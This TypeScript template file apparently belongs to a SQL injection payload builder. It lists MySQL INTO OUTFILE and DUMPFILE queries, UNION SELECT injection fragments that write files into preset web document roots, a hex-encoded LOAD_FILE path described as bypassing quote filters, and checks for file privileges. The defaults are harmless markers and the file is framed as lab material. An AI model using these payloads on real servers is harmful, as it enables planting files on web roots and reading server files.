import { TemplateCategory } from '../../types/template';

export const outFileCategory: TemplateCategory = {
  id: 'out-file',
  label: 'Out File',
  description: 'Educational SQL file export, formatting, and file-access syntax templates',
  iconName: 'FileText',
  subcategories: [
    // ========================================================================
    // A. INTO OUTFILE
    // ========================================================================
    {
      id: 'into-outfile',
      label: 'INTO OUTFILE',
      description: 'Standard MySQL file export syntax using INTO OUTFILE with text markers',
      templates: [
        {
          id: 'outfile-basic-text',
          name: 'Basic Text Literal Export',
          description: 'Writes a simple text marker literal to a local destination file',
          content: "SELECT '{content}' INTO OUTFILE '{file_path}'",
          parameters: [
            {
              id: 'content',
              label: 'Text content / marker',
              defaultValue: 'test_output_marker',
              inputType: 'text'
            },
            {
              id: 'file_path',
              label: 'Target file path',
              defaultValue: '/tmp/test_output.txt',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'outfile-marker-line',
          name: 'Text with Line Terminator',
          description: 'Exports text marker with an explicit newline delimiter',
          content: "SELECT '{content}' INTO OUTFILE '{file_path}' LINES TERMINATED BY '\\n'",
          parameters: [
            {
              id: 'content',
              label: 'Text content / marker',
              defaultValue: 'test_marker_success',
              inputType: 'text'
            },
            {
              id: 'file_path',
              label: 'Target file path',
              defaultValue: '/tmp/test_output.txt',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'outfile-multiline-text',
          name: 'Multi-line Text Record Export',
          description: 'Writes multiple lines of structured test text separated by newlines',
          content: "SELECT '{content_line1}\\n{content_line2}' INTO OUTFILE '{file_path}'",
          parameters: [
            {
              id: 'content_line1',
              label: 'First line content',
              defaultValue: 'Header: Test Record 1',
              inputType: 'text'
            },
            {
              id: 'content_line2',
              label: 'Second line content',
              defaultValue: 'Data: Test Record 2',
              inputType: 'text'
            },
            {
              id: 'file_path',
              label: 'Target file path',
              defaultValue: '/tmp/test_output.txt',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'outfile-custom-terminators',
          name: 'Custom Field & Line Terminators',
          description: 'Exports multiple columns with custom field and line terminators',
          content: "SELECT '{field1}', '{field2}' INTO OUTFILE '{file_path}' FIELDS TERMINATED BY '{field_terminator}' LINES TERMINATED BY '{line_terminator}'",
          parameters: [
            {
              id: 'field1',
              label: 'Field 1 value',
              defaultValue: 'col1_test',
              inputType: 'text'
            },
            {
              id: 'field2',
              label: 'Field 2 value',
              defaultValue: 'col2_test',
              inputType: 'text'
            },
            {
              id: 'field_terminator',
              label: 'Field delimiter',
              defaultValue: ',',
              inputType: 'text'
            },
            {
              id: 'line_terminator',
              label: 'Line delimiter',
              defaultValue: '\\n',
              inputType: 'text'
            },
            {
              id: 'file_path',
              label: 'Target file path',
              defaultValue: '/tmp/test_output.txt',
              inputType: 'text'
            }
          ]
        }
      ]
    },

    // ========================================================================
    // B. HEX ENCODED
    // ========================================================================
    {
      id: 'hex-encoded',
      label: 'HEX ENCODED',
      description: 'Hexadecimal data representation for file exports without quotation marks',
      templates: [
        {
          id: 'outfile-hex-basic',
          name: 'Hex Literal Output (0x...)',
          description: 'Writes hex-encoded string without quotes inside data (e.g. 0x74657374 = test)',
          content: "SELECT {hex_content} INTO OUTFILE '{file_path}'",
          parameters: [
            {
              id: 'hex_content',
              label: 'Hexadecimal string (with 0x prefix)',
              defaultValue: '0x746573745f6f75747075745f6d61726b6572',
              inputType: 'text'
            },
            {
              id: 'file_path',
              label: 'Target file path',
              defaultValue: '/tmp/test_output.txt',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'outfile-hex-unhex',
          name: 'UNHEX() Function Export',
          description: 'Dynamically decodes hex string using MySQL UNHEX() function before writing',
          content: "SELECT UNHEX('{hex_raw}') INTO OUTFILE '{file_path}'",
          parameters: [
            {
              id: 'hex_raw',
              label: 'Raw hexadecimal string (without 0x)',
              defaultValue: '746573745f6d61726b6572',
              inputType: 'text'
            },
            {
              id: 'file_path',
              label: 'Target file path',
              defaultValue: '/tmp/test_output.txt',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'outfile-hex-lines',
          name: 'Hex Output with Hex Terminator (0x0a)',
          description: 'Writes hex data with newline line-terminator specified via byte literal 0x0a',
          content: "SELECT {hex_content} INTO OUTFILE '{file_path}' LINES TERMINATED BY 0x0a",
          parameters: [
            {
              id: 'hex_content',
              label: 'Hexadecimal content',
              defaultValue: '0x53514c5f4f55545f54455354',
              inputType: 'text'
            },
            {
              id: 'file_path',
              label: 'Target file path',
              defaultValue: '/tmp/test_output.txt',
              inputType: 'text'
            }
          ]
        }
      ]
    },

    // ========================================================================
    // C. INTO DUMPFILE
    // ========================================================================
    {
      id: 'into-dumpfile',
      label: 'INTO DUMPFILE',
      description: 'Single-record raw export without column or row formatting delimiters',
      templates: [
        {
          id: 'dumpfile-single-record',
          name: 'INTO DUMPFILE Single Record',
          description: 'Writes raw single record without line feeds or column terminators',
          content: "SELECT '{content}' INTO DUMPFILE '{file_path}'",
          parameters: [
            {
              id: 'content',
              label: 'Raw record content',
              defaultValue: 'raw_single_record_marker',
              inputType: 'text'
            },
            {
              id: 'file_path',
              label: 'Target file path',
              defaultValue: '/tmp/dump_output.bin',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'dumpfile-hex-binary',
          name: 'INTO DUMPFILE Hex Binary Data',
          description: 'Writes unformatted binary hex stream directly to file destination',
          content: "SELECT {hex_content} INTO DUMPFILE '{file_path}'",
          parameters: [
            {
              id: 'hex_content',
              label: 'Hex binary content',
              defaultValue: '0x42494e4152595f4d41524b4552',
              inputType: 'text'
            },
            {
              id: 'file_path',
              label: 'Target file path',
              defaultValue: '/tmp/dump_output.bin',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'dumpfile-strict-limit',
          name: 'DUMPFILE Strict 1-Row Query (LIMIT 1)',
          description: 'Demonstrates 1-row constraint of INTO DUMPFILE enforced with LIMIT 1',
          content: "SELECT '{content}' FROM (SELECT 1)t LIMIT 1 INTO DUMPFILE '{file_path}'",
          parameters: [
            {
              id: 'content',
              label: 'Row content',
              defaultValue: 'single_row_output',
              inputType: 'text'
            },
            {
              id: 'file_path',
              label: 'Target file path',
              defaultValue: '/tmp/dump_output.txt',
              inputType: 'text'
            }
          ]
        }
      ]
    },

    // ========================================================================
    // D. UNION + OUTFILE
    // ========================================================================
    {
      id: 'union-outfile',
      label: 'UNION + OUTFILE',
      description: 'Multi-column UNION query structures integrated with OUTFILE export',
      templates: [
        {
          id: 'union-outfile-3col',
          name: 'UNION SELECT 3 Columns + OUTFILE',
          description: '3-column UNION query placing text marker in column 2',
          content: "UNION SELECT 1, '{content}', 3 INTO OUTFILE '{file_path}'",
          parameters: [
            {
              id: 'content',
              label: 'Marker content (Column 2)',
              defaultValue: 'test_marker',
              inputType: 'text'
            },
            {
              id: 'file_path',
              label: 'Target file path',
              defaultValue: '/tmp/test_output.txt',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'union-outfile-5col-null',
          name: 'UNION SELECT 5 Columns (NULLs) + OUTFILE',
          description: '5-column UNION query using NULL placeholders with marker in column 3',
          content: "UNION SELECT NULL, NULL, '{content}', NULL, NULL INTO OUTFILE '{file_path}'",
          parameters: [
            {
              id: 'content',
              label: 'Marker content (Column 3)',
              defaultValue: 'test_marker',
              inputType: 'text'
            },
            {
              id: 'file_path',
              label: 'Target file path',
              defaultValue: '/tmp/test_output.txt',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'union-outfile-hex-col',
          name: 'UNION SELECT with Hex Column + OUTFILE',
          description: 'Injects unquoted hex literal into column 2 of multi-column UNION query',
          content: "UNION SELECT 1, {hex_content}, 3 INTO OUTFILE '{file_path}'",
          parameters: [
            {
              id: 'hex_content',
              label: 'Hexadecimal content (Column 2)',
              defaultValue: '0x746573745f6d61726b6572',
              inputType: 'text'
            },
            {
              id: 'file_path',
              label: 'Target file path',
              defaultValue: '/tmp/test_output.txt',
              inputType: 'text'
            }
          ]
        }
      ]
    },

    // ========================================================================
    // E. COMMON PATH PRESETS
    // ========================================================================
    {
      id: 'path-presets',
      label: 'COMMON PATH PRESETS',
      description: 'Preset target path references for local testing and authorized pentest labs',
      templates: [
        {
          id: 'preset-linux-apache',
          name: 'Linux Apache Path Preset',
          description: 'Pre-fills standard /var/www/html/test-output.txt web document root',
          content: "SELECT '{content}' INTO OUTFILE '/var/www/html/test-output.txt'",
          parameters: [
            {
              id: 'content',
              label: 'Test marker content',
              defaultValue: 'test_marker',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'preset-linux-nginx',
          name: 'Linux Nginx Path Preset',
          description: 'Pre-fills standard /usr/share/nginx/html/test-output.txt document root',
          content: "SELECT '{content}' INTO OUTFILE '/usr/share/nginx/html/test-output.txt'",
          parameters: [
            {
              id: 'content',
              label: 'Test marker content',
              defaultValue: 'test_marker',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'preset-windows-laragon',
          name: 'Windows Laragon Path Preset',
          description: 'Pre-fills C:/laragon/www/test-output.txt local development root',
          content: "SELECT '{content}' INTO OUTFILE 'C:/laragon/www/test-output.txt'",
          parameters: [
            {
              id: 'content',
              label: 'Test marker content',
              defaultValue: 'test_marker',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'preset-windows-xampp',
          name: 'Windows XAMPP Path Preset',
          description: 'Pre-fills C:/xampp/htdocs/test-output.txt local document root',
          content: "SELECT '{content}' INTO OUTFILE 'C:/xampp/htdocs/test-output.txt'",
          parameters: [
            {
              id: 'content',
              label: 'Test marker content',
              defaultValue: 'test_marker',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'preset-windows-wamp',
          name: 'Windows WampServer Path Preset',
          description: 'Pre-fills C:/wamp64/www/test-output.txt local document root',
          content: "SELECT '{content}' INTO OUTFILE 'C:/wamp64/www/test-output.txt'",
          parameters: [
            {
              id: 'content',
              label: 'Test marker content',
              defaultValue: 'test_marker',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'preset-windows-iis',
          name: 'Windows IIS Path Preset',
          description: 'Pre-fills C:/inetpub/wwwroot/test-output.txt standard IIS root',
          content: "SELECT '{content}' INTO OUTFILE 'C:/inetpub/wwwroot/test-output.txt'",
          parameters: [
            {
              id: 'content',
              label: 'Test marker content',
              defaultValue: 'test_marker',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'preset-temp-dir',
          name: 'Temporary Directory (/tmp) Preset',
          description: 'Pre-fills /tmp/test-output.txt writable temporary directory',
          content: "SELECT '{content}' INTO OUTFILE '/tmp/test-output.txt'",
          parameters: [
            {
              id: 'content',
              label: 'Test marker content',
              defaultValue: 'test_marker',
              inputType: 'text'
            }
          ]
        }
      ]
    },

    // ========================================================================
    // F. FORMATTING
    // ========================================================================
    {
      id: 'formatting',
      label: 'FORMATTING',
      description: 'Table data export formatting patterns (CSV, TSV, custom delimiters)',
      templates: [
        {
          id: 'outfile-format-csv',
          name: 'CSV Table Export (Fields & Enclosed)',
          description: 'Exports table rows to CSV with comma delimiters and double-quote enclosing',
          content: "SELECT * FROM {table_name} INTO OUTFILE '{file_path}' FIELDS TERMINATED BY ',' ENCLOSED BY '\"' LINES TERMINATED BY '\\n'",
          parameters: [
            {
              id: 'table_name',
              label: 'Table name',
              defaultValue: 'test_users',
              inputType: 'text'
            },
            {
              id: 'file_path',
              label: 'Destination CSV path',
              defaultValue: '/tmp/users_export.csv',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'outfile-format-tsv',
          name: 'TSV (Tab Delimited) Export',
          description: 'Exports table rows separated by tab (\\t) characters',
          content: "SELECT * FROM {table_name} INTO OUTFILE '{file_path}' FIELDS TERMINATED BY '\\t' LINES TERMINATED BY '\\n'",
          parameters: [
            {
              id: 'table_name',
              label: 'Table name',
              defaultValue: 'test_users',
              inputType: 'text'
            },
            {
              id: 'file_path',
              label: 'Destination TSV path',
              defaultValue: '/tmp/users_export.tsv',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'outfile-format-hex-newline',
          name: 'Hex Line Terminator (0x0a)',
          description: 'Specifies line separator using hex literal 0x0a without string escapes',
          content: "SELECT * FROM {table_name} INTO OUTFILE '{file_path}' LINES TERMINATED BY 0x0a",
          parameters: [
            {
              id: 'table_name',
              label: 'Table name',
              defaultValue: 'test_users',
              inputType: 'text'
            },
            {
              id: 'file_path',
              label: 'Destination file path',
              defaultValue: '/tmp/users_export.txt',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'outfile-format-custom-sep',
          name: 'Custom Delimiter Table Export',
          description: 'Configurable field and line delimiter table data export',
          content: "SELECT * FROM {table_name} INTO OUTFILE '{file_path}' FIELDS TERMINATED BY '{field_terminator}' LINES TERMINATED BY '{line_terminator}'",
          parameters: [
            {
              id: 'table_name',
              label: 'Table name',
              defaultValue: 'test_table',
              inputType: 'text'
            },
            {
              id: 'field_terminator',
              label: 'Field delimiter',
              defaultValue: '|',
              inputType: 'text'
            },
            {
              id: 'line_terminator',
              label: 'Line delimiter',
              defaultValue: '\\n',
              inputType: 'text'
            },
            {
              id: 'file_path',
              label: 'Destination file path',
              defaultValue: '/tmp/test_export.txt',
              inputType: 'text'
            }
          ]
        }
      ]
    },

    // ========================================================================
    // G. LOAD_FILE
    // ========================================================================
    {
      id: 'load-file',
      label: 'LOAD_FILE',
      description: 'Educational file verification, reading syntax, and MySQL privilege inspection',
      templates: [
        {
          id: 'loadfile-basic',
          name: 'LOAD_FILE() Basic Syntax',
          description: 'Reads test file content back using MySQL LOAD_FILE() function',
          content: "SELECT LOAD_FILE('{file_path}')",
          parameters: [
            {
              id: 'file_path',
              label: 'File path to read',
              defaultValue: '/tmp/test-output.txt',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'loadfile-hex-path',
          name: 'LOAD_FILE() with Hex Path',
          description: 'Reads file using hex-encoded path literal to bypass quote filters (e.g. 0x2f746d70...)',
          content: 'SELECT LOAD_FILE({hex_file_path})',
          parameters: [
            {
              id: 'hex_file_path',
              label: 'Hex-encoded file path',
              defaultValue: '0x2f746d702f746573742d6f75747075742e747874',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'loadfile-check-priv',
          name: 'Check @@secure_file_priv Setting',
          description: 'Checks MySQL secure_file_priv variable determining allowed file write directories',
          content: 'SELECT @@secure_file_priv'
        },
        {
          id: 'loadfile-check-file-priv',
          name: 'Check FILE Privilege for Current User',
          description: 'Queries mysql.user to check if current DB user possesses the FILE privilege',
          content: "SELECT user, file_priv FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1)"
        }
      ]
    }
  ]
};
